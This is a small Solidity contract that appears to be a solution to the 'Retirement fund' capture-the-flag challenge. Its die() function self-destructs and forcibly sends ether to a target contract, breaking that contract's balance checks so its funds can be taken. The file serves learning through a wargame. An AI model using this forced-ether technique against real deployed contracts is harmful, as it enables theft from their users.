pragma solidity ^0.4.21;

contract RetirementFundSolver {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function die(address target) public payable {
        require(msg.sender == owner, "Access denied");
        require(msg.value > 0, "Must have a value");

        selfdestruct(target);
    }
}
